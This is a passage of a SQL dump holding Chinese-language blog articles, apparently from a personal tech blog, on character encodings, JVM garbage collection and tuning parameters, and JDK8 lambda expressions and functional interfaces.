0, 0);
INSERT INTO `article` VALUES (10, 1, '编码与解码基本概念', '2019/9/1568253974_mmexport1567598596359.jpg', '### 基本概念\n1. encode编码: 将一个文件里面的内容转换成字符,字符串\n2. decode解码: 将一个字符,字符串转换成字节,字节数组\n3. 落实到真正存储都是用字节来表示的,字符字符串只是一种表示形式\n\n### 编解码方式\n#### ASCII(AmericanStandardCodeForInformationInterchange,美国信息交换标准代码)	\n1. 7 bit表示一个字符,2^7共计可以表示128个字符,这对于英文与数字字符来说够用\n\n#### ISO-8859-1 欧洲使用\n1. 8 bit表示一个字符,即用一个字节(byte)来表示一个字符,2^8共计可以表示256个字符 \n2. ISO-5589-1是在ASCII上扩展,也就说ISO-5589-1完全向下兼容ASCII\n\n#### GB2312,GBK,GB18030 中国\n1. 两个字节表示一个汉字\n\n#### UNICODE 国际\n1. 采用两个字节来表示一个字符,涵盖了全世界大部分的语言编码\n2. 缺点是存储空间膨胀,对于单用ASCII码的美国人来说,存储空间翻倍了\n\n### UTF(Unicode Translation Format)\n#### 关于UTF\n1. unicode是一种编码方式,而UTF则是一种存储方式,UTF是Unicode的实现方式之一\n2. 注意UTF-8,UTF-16,UTF-32并不是编码方式,而是unicode的一种实现方式\n\n#### UTF-8\n1. 变长字节表示形式,兼容ISO-8859-1与UTF-8,英文等用1字节表示\n2. 一般来说,UTF-8会通过3个字节来表示一个中文,UTF-8最多情况用6字节表示一个字符\n3. UTF-8是非常通用的,也是非常推荐的\n\n#### UTF-16LE(lititle endian)与UTF16BE(big endian)区别\n1. UTF16是Unicode的实现方式之一采用两个字节来表示一个字符,存储空间膨胀\n2. 在unicode规范当中,定义一种信息,对于磁盘上每一个文件,在这个文件最前面会加上一个隐藏不可见字符,全称叫做ZeroWithNoBreakSpace,实际上这个字符是不存在的,\n3. 它会用字符编码来表示0XFEFF,如果在文件的开头出现0XFEFF的话,那么这种文件称之为叫(BE),反过来出现0XFFFE(LE)\n\n#### BOM(ByteOrderMark)字节序\n1. 在windows编码中经常可以看到带BOM与无BOM,字节序标记头\n2. 就如UTF-16的BE与LE一样,如果在文件的开头出现字节序标记头,就称为有BOM,无则称为无BOM\n3. 这是windows系统的过度设计,在linux与mac系统中不存在该问题\n4. 由于有无BOM的原因,导致部分软件没有考虑到这种情况导致编码解析错误\n\n### 常见问题代码范例\n#### 程序代码\n```java\npublic class CodeTest {\n    public static void main(String[] args) throws Exception {\n        String inputFile = \"CodeTestInput.txt\";\n        String outputFile = \"CodeTestOutput.txt\";\n\n        RandomAccessFile inputRandomAccessFile = new RandomAccessFile(inputFile, \"r\");\n        RandomAccessFile outputRandomAccessFile = new RandomAccessFile(outputFile, \"rw\");\n\n        long inputLength = new File(inputFile).length();\n        FileChannel inputFileChannel = inputRandomAccessFile.getChannel();\n        FileChannel outputFileChannel = outputRandomAccessFile.getChannel();\n\n        MappedByteBuffer inputData = inputFileChannel.map(FileChannel.MapMode.READ_ONLY, 0, inputLength);\n\n        System.out.println(\"====================\");\n        // 遍历当前计算机系统所有支持的字符集\n        Charset.availableCharsets().forEach((k, v) -> {\n            // System.out.println(k + \", \" + v);\n        });\n        System.out.println(\"====================\");\n\n        // 为什么iso-8859-1情况下依然能正常显示中文\n        Charset charset = Charset.forName(\"ISO-8859-1\");\n        CharsetDecoder decoder = charset.newDecoder();\n        CharsetEncoder encoder = charset.newEncoder();\n\n        // 转换成charBuffer\n        CharBuffer charBuffer = decoder.decode(inputData);\n        // 编码成ByteBuffer\n        ByteBuffer outputData = encoder.encode(charBuffer);\n        // ByteBuffer outputData = Charset.forName(\"utf-8\").encode(charBuffer);\n        outputFileChannel.write(outputData);\n\n        inputRandomAccessFile.close();\n        outputRandomAccessFile.close();\n    }\n} \n```\n#### CodeTestInput.txt\n```java\nhello\nworld\n你好\n世界\n```\n#### 图示\n![decodeencode1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567610061_decodeencode1.png)\n1. 这是许多人遇见编码问题有时候摸不着头脑的玄学地方,为什么编码不同怎么可以正常显示原数据中文\n2. 因为输入文件编码是UTF-8,而程序却是其他编码,但是文件为什么没有出现乱码\n3. 程序在编码之间虽然乱码了,但是在输出文件的数据依然是原封不懂的原数据\n4. 经过程序一层转换,并不影响采用与输入文件相同的编码来查看内容', 0, 0, 55, 0, 0, '2018-08-11 17:08:15', '2019-09-12 10:06:21', 0, 0);
INSERT INTO `article` VALUES (11, 1, 'Jvm垃圾回收策略', '2018/8/1533987277_f21ee5e433b7d4dc2d1dfc2b2e9d9af6.jpg', '## 概念\r\n### 什么是垃圾回收机制\r\n1. *不定时去堆内存中清理不可达对象*。不可达的对象并不会马上就会直接回收,垃圾收集器在一个Java程序中的执行是自动的,不能强制执行,即使程序员能明确地判断出有一块内存已经无用了,是应该回收的.程序员也不能强制垃圾收集器回收该内存块。\r\n2. 程序员唯一能做的就是通过调用System.gc 方法来\"建议\"执行垃圾收集器,但其是否可以执行.什么时候执行却都是不可知的。这也是垃圾收集器的最主要的缺点。当然相对于它给程序员带来的巨大方便性而言.这个缺点是瑕不掩瑜的。\r\n\r\n#### system.gc()是什么\r\n1. 提示给gc进行回收垃圾,但是不表示立即进行回收\r\n\r\n#### 什么是不可达对象\r\n1. 没有被继续引用,与GCRoots无依赖关系\r\n\r\n#### finalize方法是什么\r\n1. 垃圾回收机制之前进行执行的事件钩子,它是在Object类中定义的\r\n\r\n## 垃圾回收机制如何判断不可达对象\r\n### 引用计数法(已淘汰)\r\n1. 每个对象有一个年龄,如果小于或者等于15岁存放在新生代,大于15岁就会存放在老年代\r\n2. GC线程不定时进行回收时,如果对象被引用的话,年龄会加1,如果没有被继续回收年龄会减1\r\n3. 如果年龄为0岁,会被垃圾回收机制认为是不可达的对象,会被清理掉\r\n4. 淘汰,原因是循环依赖问题(闭环依赖问题)\r\n\r\n#### 什么是闭环依赖问题\r\n```java\r\nObject objA = new Object();\r\nObject objB = new Object();\r\nobjA.instance = objB;\r\nobjB.instance = objA;\r\nobjA = null;\r\nobjB = null;\r\n```\r\n##### 当发生这种场景时,GC无法找到objA和objB是否为0,这种情况就导致objA和objB无法被回收掉,这就是闭环依赖问题\r\n\r\n### 根搜索(GC Roots)\r\n![cgroots.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545216501_cgroots.png)\r\n1. 判断是否可达: 需要和根节点有依赖关系\r\n2. 必须和GC Roots有任何引用情况下,这时候GC认为就是可达对象\r\n3. 如果没有和GC Roots有任何引用的情况下,这时候GC认为就是不可达对象\r\n\r\n#### 作为GCRoots的对象包括几种\r\n1. 虚拟机栈(栈帧中的局部变量区,也叫做局部变量表)中引用的对象\r\n2. 方法区中的类静态属性引用的对象\r\n3. 方法区中常量引用的对象\r\n4. 本地方法栈中JNI(Native方法)引用的对象\r\n\r\n### 对象在内存中的状态\r\n#### 可达状态\r\n1. 当一个对象被创建后，有一个以上的引用变量引用它\r\n2. 在GCRoots中可以从起始顶点导航到该对象，那么它就处于可达状态\r\n3. 程序可以通过引用变量来调用该对象的属性和方法\r\n\r\n#### 可恢复状态\r\n1. 某个对象不再有任何引用变量引用它，它先进入可恢复状态\r\n2. 此时从GCRoots的起始顶点导航不能导航到该对象\r\n3. 在这种状态下，系统的垃圾回收机制准备回收该对象所占用的内存\r\n4. 在回收该对象之前，系统会调用可恢复状态对象的finalize方法进行资源管理\r\n5. 如果系统调用finalize方法重新让一个以上的引用变量引用该对象\r\n6. 则这个对象会再次变为可达状态，否则，该对象将进入不可达状态\r\n\r\n#### 不可达状态\r\n1. 当对象的所有关联都被切断，且系统调用所有兑现过的finalize方法依然没有使该对象变成可达状态后\r\n2. 这个对象将永久性地失去引用，最后变成不可达状态\r\n3. 只有当一个对象处于不可达状态时，系统才会真正回收该对象所占用的资源\r\n\r\n### 对象引用方式\r\n##### 引用方式生产环境为强引用,引用方式只需了解,因为硬件的发展所以其他引用变得没有用武之地\r\n#### 强引用\r\n1. 这是最常见的引用，程序创建一个对象，并把这个对象赋给一个引用变量，这个引用变量就是强引用\r\n2. 强引用是Java编程中广泛使用的引用类型，被强引用所引用的Java对象绝不会被垃圾回收机制回收\r\n3. 即使系统内存非常紧张，即使用有些Java对象以后永远不会被用到，jvm也不会回收被强引用所引用的Java对象\r\n4. 由于jvm肯定不会回收被强引用的所引用的Java对象，因此强引用是造成Java内存泄露的主要原因之一\r\n\r\n#### 软引用\r\n1. 软引用需要通过SoftReference类来实现\r\n2. 当一个对象只具有软引用时，它有可能被垃圾回收机制回收\r\n3. 当系统内存空间足够时，它不会被系统回收，程序可以使用该对象\r\n4. 当系统内存不足时，系统将会回收它\r\n5. 软引用通常用于内存敏感的程序中，软引用是强引用很好的替代\r\n6. 如果系统堆内存空间紧张，那么使用软引用是一种较好的方案\r\n7. 可提高程序运行效率，避免垃圾回收\r\n\r\n#### 虚引用\r\n1. 虚引用不能单独使用，必须和引用队列联合使用\r\n2. 虚引用通过PhantomReference类实现，它完全类似于没有引用\r\n3. 虚引用对对象本身没有太大影响，对象只有一个虚引用，那么它和没有引用的效果大致相同\r\n4. 主要作用是跟踪对象被垃圾回收的状态，系统无法通过虚引用来获得被引用的对象\r\n5. 引用队列由ReferenceQueue类来表示，它用于保存被回收后对象的引用\r\n6. 当把软引用、弱引用和引用队列联合使用时，系统回收对象时，将把被回收对象的引用添加到关联的引用队列中\r\n7. 虚引用在对象被释放之前就已经把引用添加到引用队列当中，这使得可以在对象被回收之前采取行动\r\n8. 程序通过检查与虚引用关联的引用队列中是否已经包含指定的虚引用，从而了解引用所引用的对象是否即将被回收\r\n\r\n#### 弱引用\r\n1. 弱引用通过过WeakReference、WeakHashMap类实现\r\n2. 弱引用具有很大的不确定性，因为每次垃圾回收机制执行时都会回收弱引用所引用的对象\r\n3. 获取弱引用所引用的对象时，必须小心空指针异常\r\n4. 弱引用所引用的对象生存期更短\r\n5. 与软引用类似，但引用级别更低\r\n6. 对于只有弱引用对象，当系统垃圾回收机制运行时\r\n7. 无论系统内存是否足够，总会回收该对象所占用的内存\r\n\r\n\r\n## 新生代与老生代\r\n![yongAndold.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545216752_yongAndold.png)\r\n##### jvm基于分代达成垃圾回收\r\n1. 新生代: 刚出生不久的对象,存放在新生代里面,存放不是经常使用的对象,新生代包含eden,from,to三区域,默认占比2:1:1\r\n2. 老年代: 存放比较活跃对象,存放经常被引用对象\r\n3. 垃圾回收机制回收在新生代中比较频繁(不常引用所以回收多),老年代回收次数比较少(经常被引用所以回收少)\r\n4. 理解eden,s0(from),s1(to)需要了解*垃圾回收策略*\r\n\r\n#### 永久代(Permanent)\r\n1. 永久代主要用于装载Class、方法等信息，默认为64MB \r\n2. 永久代满时也会触发FullGC(新生代老年代全部清理),会导致Class,Method元信息的卸载\r\n3. JDK8后取消了永久区\r\n\r\n## 垃圾回收策略\r\n### 垃圾回收策略有哪些\r\n1. 标记清除算法\r\n2. 标记压缩算法\r\n3. 复制算法\r\n4. 分代算法\r\n\r\n##### 需要详细讲解\r\n### 标记清除算法\r\n![gcflagclear.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545220367_gcflagclear.png)\r\n1. 依次标记,0标记为存活,1标识为没有存活\r\n2. 垃圾内存回收机制遍历堆内存中标识为不可达的对象进行清理\r\n3. 应用场景: 老年代,因为老年代回收不频繁\r\n4. 会产生碎片化,因为内存不够连贯\r\n\r\n### 标记压缩算法\r\n![gcflagtar.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545220482_gcflagtar.png)\r\n1. 与标记清除算法基本一致,但增加了排序\r\n2. 将全部可达对象放在一边,将不可达对象放在另一边\r\n3. 随后将不可达对象的区域全部清除\r\n4. 解决了碎片化问题\r\n\r\n### 复制算法\r\n![gccopy.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545220367_gccopy.png)\r\n1. 新生代对象经常使用时先放入eden区\r\n2. 当eden区对象经常使用会放入s0区\r\n3. *当垃圾回收时会检查s0区的所有对象,检查是否是可达对象*\r\n4. s0中所有可达对象复制放入s1中\r\n5. s0中只剩下的不可达对象全部进行清除\r\n6. *当垃圾回收时会检查s1区的所有对象,检查是否是可达对象*\r\n7. s1中所有可达对象复制放入s0中\r\n8. s1中只剩下的不可达对象全部进行清除\r\n9. 重复s0与s1间相互复制移动\r\n11. s0与s1有一个一定是空的,目的是为了存放下一次复制\r\n12. 能够解决碎片化问题,快速,清理干净但浪费空间\r\n\r\n### 分代算法\r\n1. 这种算法，根据对象的存活周期的不同将内存划分成几块,划分新生代和老年代,这样就可以根据各个年代的特点采用最适当的收集算法\r\n2. 分代算法是综合使用回收算法,对新生代采用复制,对老年代采用标记压缩,而不是两代都用同一种算法\r\n\r\n### GC触发机制\r\n1. 当新生代满时就会触发MinorGC,这里的新生代指的是eden区满,Survivor(s区)满不会触发FullGC\r\n2. 当老年代满是会引发FullGC,FullGC将会同时回收新生代,老年代,*当永久代(静态量)满时也会触发FullGC,会导致Class,Method元信息的卸载*\r\n3. 虚拟机给每个对象定义了一个对象年龄(Age)计数器。如果对象在 Eden 出生并经过第一次MinorGC后仍然存活,并且能被 Survivor 容纳的话,将被移动到 Survivor空间中,并将对象年龄设为1。对象在 Survivor 区中每熬过一次MinorGC,年龄就增加 1 岁,当它的年龄增加到一定程度(默认为 15 岁)时,就会被晋升到老年代中。对象晋升老年代的年龄阈值,可以通过JVM参数 -XX:MaxTenuringThreshold (阈值)来设置\r\n\r\n#### MinorGC和FullGC的区别\r\n1. 新生代GC(MinorGC): 指发送在新生代的垃圾收集动作,因为Java对象大多都具备朝生夕灭的特性,所以MinorGC非常频繁,一般回收速度也快\r\n2. 老年代GC(MajorGC/FullGC): 指发生在老年代的GC。MajorGC,经常会伴随至少一次的MinorGC(但非绝对的,在ParallelScavenge收集器策略里,就有直接进行MajorGC的策略选择过程)。MajorGC速度一般会比MinGC慢10倍以上', 1, 0, 62, 0, 0, '2018-08-11 19:36:06', '2019-02-22 00:08:39', 0, 0);
INSERT INTO `article` VALUES (12, 1, 'Jvm参数与垃圾收集器', '2018/8/1533989771_3af90fdbe9201deb4bcccba65c637342.jpg', '## JVM参数\n### JVM参数是什么\n1. 用于配置JVM内存等信息\n2. 用于优化程序吞吐量,提高程序性能\n\n### 常用的参数\n1. -Xms: 堆初始值\n2. -Xmx: 堆最大可用值\n3. -XX:+PermSize: 非堆区初始内存分配大小(方法区,永久区)\n4. -XX:newSize: 新生代初始内存的大小\n5. -XX:SurvivorRatio: 设置新生代中eden空间和from/to空间的比例\n6. -XX:NewRatio: 配置新生代与老年代占比\n7. -XX:MaxTenuringThreshold: 进入老年代所需要的年龄\n8. -XX:+PrintGC: 每次触发GC的时候打印相关日志\n9. -XX:+PrintGCDetails: 更详细的GC日志\n10. -XX:+HeapDumpOnOutOfMemoryError: 遇到OutOfMemoryError时拍摄一个“堆转储快照”,并将其保存在一个文件中\n\n#### 示例\n##### -Xms20m -Xmx20m -XX:SurvivorRatio=2 -XX:NewRatio=2 -XX:+PrintGCDetails -XX:+UseSerialGC\n##### 堆初始值20m,堆最大值20m,eden空间和from/to空间占比为2/1,新生代与老年代占比为1/2,更详细的GC日志使用串行回收\n\n### 常见问题\n1. 堆内存溢出: 堆内存不够,就会去回收垃圾,初始化,就不去回收垃圾\n2. 栈溢出: 默认最大深度1w+,-Xss1m 可以更改最大深度,默认深度1w左右\n\n#### 内存溢出和内存泄漏的区别\n1. 内存溢出: 存储空间不够大,就像水倒多了,从杯子溢了出来\n2. 内存泄漏: 使用过的内存空间没有被及时释放,长期占用内存,最终导致内存空间不足(内存泄漏也算是内存溢出的一种)\n\n#### JVM基本调优\n1. 要减少GC垃圾回收次数\n2. *堆的初始值和堆的最大值一定要一致*\n3. *垃圾回收次数与最大堆内存值没有关系*,与堆初始值有关系\n4. 初始堆值和最大堆内存内存越大,吞吐量就越高\n5. *初始堆值越高,吞吐量越高*\n\n## 垃圾收集器 \n#### 有哪些垃圾收集器\n1. serial收集器(串行)\n2. parNew收集器(半并行)\n3. parallel收集器(并行)\n4. cms收集器(并行)\n5. g1收集器(并行)\n\n#### 并行回收和串行回收的区别\n1. 串行回收: JDK5前的默认算法,缺点是只有一个线程\n2. 并行回收: 多个线程执行垃圾回收适合于吞吐量的系统\n\n### serial收集器\n1. 串行收集器是最古老的收集器\n2. 可能会产生较长的停顿,只使用一个线程去回收\n3. 垃圾收集的过程中会StopTheWorld(服务暂停)\n4. 一个单线程的收集器,在进行垃圾收集时候,必须暂停其他所有的工作线程直到它收集结束\n5. CPU利用率高,停顿时间即用户等待时间比较长\n6. JVM参数-XX:UseSerialGC开启\n7. 新生代,老年代都使用串行回收\n8. 新生代采用复制算法,老年代采用标记压缩算法\n\n### parNew收集器\n1. ParNew收集器其实就是Serial收集器的多线程版本\n2. JVM参数-XX:+UseParNewGC开启\n3. JVM参数-XX:ParallelGCThreads限制线程数量\n4. 新生代并行,老年代串行\n5. 新生代复制算法,老年代标记压缩\n\n### parallel收集器\n1. 类似parNew收集器,但parallel收集器更关注于系统的吞吐量,可以通过参数打开自适应调节策略\n2. 虚拟机会根据当前系统的运行情况收集性能监控信息\n3. 可以通过参数以提供最合适的停顿时间或最大吞吐量\n4. 可以通过参数控制GC的时间不大于多少毫秒或者比例\n5. 采用多线程来通过扫描并压缩堆\n6. 停顿时间短,回收效率高,对吞吐量要求高\n7. JVM参数-XX:+UseParallelGC开启\n8. 新生代,老年代都使用并行回收\n9. 新生代复制算法,老年代标记压缩\n\n#### 与parNew收集器区别主要改变在老年代的三个阶段\n1. mark: 系统首先将老年代划分成几个固定大小的区域,多个垃圾回收线程会并行标记老年代代中的可达对象当某个对象被标记成可达对象时，还会更新该对象所在区域的大小，以及该对象的位置信息\n2. summary: 直接操作老年代的区域，而不是单个对象由于每次垃圾回收的压缩都会在老年代的左边部分存储大量的可达对象，对这样高密度的可达对象区域进行压缩往往很不划算所以summary阶段从最左边的区域开始检测每个区域的密度，当检测到某个区域能回收的空间达到某个数值时(也就是可达对象的密度较小时),垃圾回收器会判定该区域，以及该区域的右边的所有区域都应该进行回收,而该区域的左边的区域都会被标识为密集区域,垃圾回收器既不会把新对象移动到这些密集区域，也不会对该密集区域进行压缩,该区域和其右边的所有区域都会被压缩并回收空间.summary阶段目前还是串行操作，虽然并行是可以实现的，但重要性不如对mark和压缩阶段的并行重要\n3. compact: 回收器利用summary阶段生成的数据识别出有哪些区域是需要装填的，多个垃圾回收线程可以并行地将数据复制到这些区域中，经过这个过程后，老年代的一端会密集地存在大量的活动对象，另一端则存在大块的空闲块\n\n### CMS收集器\n1. CMS收集器是一种以获取最短回收停顿时间为目标的收集器。\n2. CMS收集器是基于*标记清除算法实现的*,它的运作过程相对于前面几种收集器来说要更复杂一些.\n3. 整个过程分为4个步骤，包括初始标记,并发标记,再标识,并发清除\n4. 并发收集、低停顿\n5. 产生大量空间碎片、并发阶段会降低吞吐量\n6. JVM参数-XX:+UseConcMarkSweepGC开启\n7. 老年代会使用cms收集器,新生代则会使用parNew收集器并行\n\n#### CMS对老年代的回收多数是并发操作，而不是并行操作。\n1. 初始化标记阶段: 垃圾回收开始时需要一个短暂的暂停,用来表示出那些被直接引用的对象\n2. 并发标识阶段: 垃圾回收器会依据在初始标识中发现的可达对象来寻找其他的可达对象\n3. 再标识阶段: 由于在并发标识阶段应用程序也会同时运行，无法保证所有的可达对象都被标识出来,因此应用程序会再次很短地暂停一下，多线程并行地重新标识之前可能因为并发而漏掉的对象,这个阶段被成为再标识阶段\n4. 并发清除阶段: 使用标记清除算法进行处理\n\n#### CMS回收器的最大改进在于对老年代的回收，它只需两次短暂的暂停，而其他过程都是与应用程序并发执行的，因此对实时性要求较高的程序更合适\n1. 对于serial、parNew收集器而言,它可以等到老年代满了之后再开始回收,反正垃圾回收器总会让应用程序暂停,但CMS回收器要与应用程序并发运行,如果老年代满了才开始回收,那么应用程序将无内存可用，所以系统默认在老年代68%满的时候就开始回收\n2. CMS不会进行内存压缩，也就是，不可达对象占用的内存被回收以后，垃圾回收器不会移动可达对象占用的内存,由于老年代的可用空间不是连续的，因此CMS垃圾回收器必须保存一份可用空间的列表，当需要分配对象时，垃圾回收器就要通过这份列表找到容纳新对象的空间，这样就会使得分配内存时的效率下降，从而影响了新生代回收过程中将新生代对象移动到老年代的效率\n3. 对于CMS回收器而言，当垃圾回收器执行并发标识时，应用程序在运行的同时也在分配对象，因此老年代也同时在增长，而且，虽然可达对象在标识阶段会被标识阶段会被识别出来，但有些在标识阶段成为垃圾的对象并不能立即被回收，只有等下次垃圾回收时才能被回收，因此CMS回收器较之前面的几种回收器需要更大的堆内存\n4. 对于永久代内存，CMS可通过运行Java程序时使用-XX:CMSClassUnloading-Enabled附加选项来强制回收永久代内存\n\n### G1收集器\n1. 在G1中,堆被划分成许多个连续的区域(region)。采用G1算法进行回收,吸收了CMS收集器特点\n2. 支持很大的堆,高吞吐量\n3. 在主线程暂停的情况下,使用并行收集\n4. 在主线程运行的情况下,使用并发收集\n5. JVM参数 -XX:+UseG1GC开启\n6. 它是JDK8后出现的收集器\n\n#### 并发和并行有什么区别\n1. 并行是指多个处理器或者是多核的处理器同时处理多个不同的任务\n2. 并发是逻辑上的同时发生(simultaneous)，而并行是物理上的同时发生\n3. 并发是一个人同时吃三个馒头,而并行是三个人同时吃三个馒头\n\n### ZGC收集器\n1. 这是一个处于实验阶段的，可扩展的低延迟垃圾收集器\n2. 它允许ZGC在对象迁移和整理阶段回收和重用内存。这有助于降低一般堆开销。这也意味着不需要为FullGC实现一个单独的标记整理算法\n3. 它通过使用着色指针和读屏障来实现非常低的暂停时间\n4. 它是JDK11出现的收集器\n\n### JVM调优总结 \n1. 初始堆值和最大堆内存内存越大,吞吐量就越高\n2. 最好使用并行收集器,因为并行收集器速度比串行吞吐量高,速度快\n3. 设置堆内存新生代的比例和老年代的比例最好为1:2或者1:3\n4. 减少GC对老年代的回收\n5. 通过jdk自带的jconsole,可以查看内存活动情况,还可以检测死锁', 1, 0, 49, 0, 0, '2018-08-11 20:16:31', '2019-02-22 00:09:09', 0, 0);
INSERT INTO `article` VALUES (13, 1, '总结JDK8特性,lambda表达式,函数接口', '2018/8/b855a6c2d725ea2eae86558d74c0acf2.jpg', '# 前言\n现在是2018年8月,距离jdk8发布已经过去快5年了,jdk10都已经发布了,而jdk8仍然有许多的学习者不为了解,大部分学校都是采用的JDK1.7及以下版本,而且讲课老师根本不会讲解JDK8那些特性,而现在JDK8特性已经完全地广泛使用,必须学会才行，所以这篇文章就是总结一下JDK8中的lambda表达式和函数接口的特性和使用\n##### 2018-9-25,jdk11发布了\n\n## 快速了解lambda表达式\n即使没有完全学习过lambda，但大多数应该看过lambda表达式的样子,它很像es6中的箭头函数\n先简单来个例子  \n```java\n// 这是传统的创建线程的方式\nnew Thread(new Runnable(){\n	@Override\n	public void run() {\n		System.out.println(\"ok\");\n	} \n}).start() \n// 这是用lambda表达式创建线程的方式\nnew Thread(()-> \n	System.out.println(\"ok\"))\n.start()\n```\n可以看出非常极简干练,比传统方式不知道高了多少个华莱士\n把代码重构仔细看看 \n```java\n// 传统的方式\nRunnable r1 = new Runnable() {\n	@Override\n	public void run() {\n		System.out.println(\"ok\");\n	}\n}\nnew Thread(r1).start();\n// lambda方式\nRunnable target2 = () -> System.out.println(\"ok\");\nnew Thread(target2).start();\n```\n可以看出lambda表达式返回的是一个Runnable接口，如果你以为只能返回Runnable接口那就错了,它可以返回任意接口,你左边用什么接口接收，它就返回什么接口\n## 自定义函数接口 \n既然什么接口都可以返回，那当然要试一下，我们自己搞一个接口试试\n```java\ninterface Interface1 {\n	int intNumber(int i )\n}\npublic class Main {\n	public static void main(String[] args) {\n		Interface i1 = (i) -> i * 2\n		System.out.println(i1.intNumber(18)); // 36\n	} \n} \n``` \n打印的是36,说明想法是正确的,lamdba表达式可以返回任意的接口，\n那它为什么知道我要调用intNumber方法。*注意!*接收接口有一个前提,这个接口必须*只有一个要被实现的方法*，很明显,我们的接口只有一个intNumber，lambda它当然就只会去找intNumber实现,我们需要把代码添加一些内容 \n```java\n@FunctionalInterface\ninterface Interface1 {\n	// 必须只有一个要实现的方法才能用lambda表达式\n	int intNumber(int i);\n	// 添加第二个要实现的方法,此时编译报错了\n	// int two(int i);\n}\npublic class Main {\n	public static void main(String[] args) {\n		Interface i1 = (i) -> i * 2\n		System.out.println(i1.intNumber(18)); // 36\n		// 下面几种和上面的意思是一样的\n		// 指定参数类型\n		Interface1 i2 = (int i) -> i * 2;\n		// 如果参数只有一个的话,那么可以把括号去掉\n		Interface1 i3 = i -> i * 2;\n		// {}中额外做一些事情,如果不加默认是直接return\n		Interface1 i4 = (int i) -> {\n			System.out.println(\"做一些事\");\n			return i * 2;\n		}; \n	}  \n} \n \n```\n1. @FunctionalInterface这个注解表示这是一个*函数接口*,用来给lambda表达式使用,它*只能有一个要被实现的方法*,它的作用是用来保证*编译校验*,注意到一开始我们没有加注解,也是可以正常执行的，但是这注解*尽量要加上*，因为如果工作中，假如这个接口是你的写的,你没有加上这个注解，你的同事会以为这就是个普通的接口，他在不知情的情况下可能会把你写的这个接口重构掉或者往里面添加一些额外的要被实现的方法，而此时会造成大规模的编译和运行报错，这锅你就得背了\n2. 至于lamdba表达式的变形,你可以参照es6中的*箭头函数*参考,因为lamdba表达式语法和箭头函数语法基本一样\n3. 这种一个接口只有一个要被实现的方法概念被称为*单一责任制*,也就是一个接口只做一个事情\n\n## 接口的默认实现方法\n接口的默认实现方法，注意!,是*接口默认实现*,接口自己实现了自己的方法,以前的课本书籍告诉我们接口是不能实现方法的,但是现在不一样了,现在接口可以把自己的方法给实现了  \n举个栗子\n```java\ninterface Interface1 {\n	// 默认实现的方法,已经实现了的\n	default int add(int x,int y) {\n		return x + y;\n	}\n	// 默认实现的方法,已经实现了的\n	default int multi(int x,int y) {\n		return x * y;\n	}\n} \nclass Achieve implements Interface1{\n \n}\npublic class Main{\n	public static void main(String[] args) {\n		Interface1 interface = new Achieve();\n		System.out.println(interface.add(1, 8)); // 9\n		System.out.println(interface.multi(8, 8));// 64 \n	}\n}  \n```\n1. 可以看到接口的方法前面加一个*defualt*就可以自己把方法给实现了，实现类完全不会被强制要求实现接口方法,这使得我们可以直接使用接口默认实现的方法  \n2. 当然,实现类可以覆盖默认方法的实现，人家叫都叫默认方法，实现类当然可以覆盖啦  \n3. 为什么要这个特性?因为Java接口有个特点,实现了接口的类必须*强制要求实现*该接口的所有*要被实现方法*,这会造成一个问题,JDK8之前定义了一堆接口，里面的方法都是*固定死的*,我现在想给接口*升级*加更多的方法要求实现,可是我不能直接加呀，加上去后,所有实现这个接口的类全会被要求强制实现,这就麻烦了，整个代码全要改。 \n\n注意默认实现方法是已被接口自己实现的方法,而不是要*被实现的方法*，所以这并不会与函数接口要求冲突，像下面这样的例子\n```java\ninterface Interface1 {\n	// 只有一个要被实现的方法\n	int intNumber(int i);\n	// 不会冲突,因为这已经被实现了,lamdba不会找他为目标\n	default int multi(int x,int y) {\n		// 默认方法里调用被实现的方法\n		this.intNumber();\n		return x *  y ;\n	}\n}\n```\n默认方法是可以被继承的,Java的接口是可以多继承的，默认方法也是可以被继承下来的\n```java\ninterface Interface1 {\n	default int intNumber(int i) {\n		return 1;\n	}\n}\ninterface Interface2 {\n	default int intNumber(int i) {\n		return 2;\n	}\n}\n// 会出现一个提示,实现哪个接口的默认方法\ninterface Interface3 extends Interface1,Interface2{\n	@Override\n	default int intNumber(int i) {\n		return Interface1.super.intNumber(i);\n	}	\n}\n```\n如果继承的多个接口方法名相同,必须只能选一个继承\n## JDK8的函数接口\n### 输入与输出\n上次是我们自定义的函数接口,就是加了@FunctionalInterface注解的那个接口  \n我们先看个例子 \n```java\n@FunctionalInterface\ninterface IMoneyFormat {\n	String format(int i);\n}\nclass AchieveMoney {\n	private final int money;	\n	public AchieveMoney(int money) {\n		this.money = money;\n	}	\n	// 接收一个接口\n	public void printMoney(IMoneyFormat money) {\n		System.out.println(\"我的存款:\"+ money.format(this.money)); // 我的存款:500 \n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		// 这是用来格式化金钱数的类 9999->9,999\n		am.printMoney(i -> new DecimalFormat(\"#,###\").format(i));\n	} \n} \n```\n上面使用lambda表达式实现了一个函数接口方法然后返回的接口作为参数传递给了pringMoney这个方法中,money.format()时就调用了lambda表达式实现的方法,应该不难理解  \n上面的代码注意到两点\n 1. lambda表达式根本不在乎实现哪个接口，它只知道我返回一个接口,你拿什么接收,我就给你什么,具体接口名是什么不关心\n 2. lambda表达式不知道接口名也不知道方法名，它只关心输入参数和返回值,也就是输入和输出\n\n### JDK函数接口\n它既不关心接口名和方法名,那么我们就可以随便拿一个接口就行了,只要*输入和输出符合条件*就行了  \nJDK8就提供了这样函数接口，修改一下代码\n```java\n class AchieveMoney {\n	private final int money;\n	public AchieveMoney(int money) {\n		this.money = money;\n	}\n	// 输入是Integer类型,输出是String类型\n	// 我们把原来自己定义的接口删了，换成了这个Function\n	public void printMoney(Function<Integer,String> fn) {\n		System.out.println(\"我的存款:\"+ fn.apply(this.money));\n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		// 符合条件的输入输出,看pringMoney方法\n		// 第一个泛型是输入类型，money 500\n		// 第二个泛型时输出类型, 被格式化金钱的字符串\n		Function<Integer,String> function = i -> new DecimalFormat(\"#,###\").format(i);\n		am.printMoney(function);\n	}\n}\n```\n仔细看的话应该可以理解  \n### 函数接口作用\n那么JDK8提供的函数接口有什么好处昵?\n1. 不用自己定义那么多接口，麻烦\n2. 它可以支持aop链式调用  \n\n看一看如何使用链式调用\n ```java\n class AchieveMoney {\n	private 